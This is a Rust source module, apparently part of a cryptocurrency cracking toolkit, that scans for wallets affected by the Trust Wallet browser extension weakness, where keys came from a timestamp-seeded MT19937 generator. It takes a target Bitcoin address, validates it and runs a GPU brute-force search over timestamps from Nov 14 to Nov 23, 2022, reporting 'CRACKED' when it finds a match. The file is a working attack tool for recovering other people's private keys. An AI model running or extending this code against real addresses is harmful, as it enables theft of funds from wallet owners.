#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;
use anyhow::Result;
use std::str::FromStr;
use tracing::{info, warn};

/// Trust Wallet Browser Extension Vulnerability (100% GPU)
/// MT19937 seeded with 32-bit timestamp
pub fn run(target: Option<String>) -> Result<()> {
    info!("Trust Wallet Vulnerability Scanner (100% GPU)");

    let target_addr_str = target
        .as_ref()
        .ok_or_else(|| anyhow::anyhow!("Target address required"))?;
    info!("Target Address: {}", target_addr_str);

    // Parse address with strict validation
    let address =
        bitcoin::Address::from_str(target_addr_str)?.require_network(bitcoin::Network::Bitcoin)?;
    let script = address.script_pubkey();

    // Strict P2PKH validation
    if !script.is_p2pkh() {
        warn!("Warning: Not a P2PKH address, skipping.");
        return Ok(());
    }

    // Verify script length (P2PKH is exactly 25 bytes)
    let script_bytes = script.as_bytes();
    if script_bytes.len() != 25 {
        anyhow::bail!(
            "Invalid P2PKH script length: {} bytes (expected 25)",
            script_bytes.len()
        );
    }

    // Verify P2PKH structure: OP_DUP OP_HASH160 <20 bytes> OP_EQUALVERIFY OP_CHECKSIG
    if script_bytes[0] != 0x76 || script_bytes[1] != 0xa9 || script_bytes[2] != 0x14 {
        anyhow::bail!("Invalid P2PKH script header");
    }

    // Safe to extract hash160 after validation
    let target_hash160: [u8; 20] = script_bytes[3..23]
        .try_into()
        .expect("Validated 25-byte P2PKH script");

    info!("Target Hash160: {}", hex::encode(target_hash160));

    // Vulnerable window: Nov 14-23, 2022
    let start_ts = 1668384000u32; // Nov 14 2022 00:00:00 UTC
    let end_ts = 1669247999u32; // Nov 23 2022 23:59:59 UTC

    info!(
        "Scanning timestamps {} to {} ({} seconds)...",
        start_ts,
        end_ts,
        end_ts - start_ts
    );

    #[cfg(not(feature = "gpu"))]
    {
        anyhow::bail!(
            "This scanner requires GPU acceleration. Please recompile with --features gpu"
        );
    }

    #[cfg(feature = "gpu")]
    {
        let start_time = std::time::Instant::now();
        let solver = GpuSolver::new()?;
        info!("[GPU] Solver initialized");

        let results = solver.compute_trust_wallet_crack(start_ts, end_ts, &target_hash160)?;

        if !results.is_empty() {
            warn!("\n[GPU] 🔓 CRACKED SUCCESSFUL!");
            for timestamp in results {
                warn!("Found Timestamp: {}", timestamp);
            }
        } else {
            info!("\nScan complete. No match found.");
        }
        info!("Time elapsed: {:.2}s", start_time.elapsed().as_secs_f64());
        Ok(())
    }
}
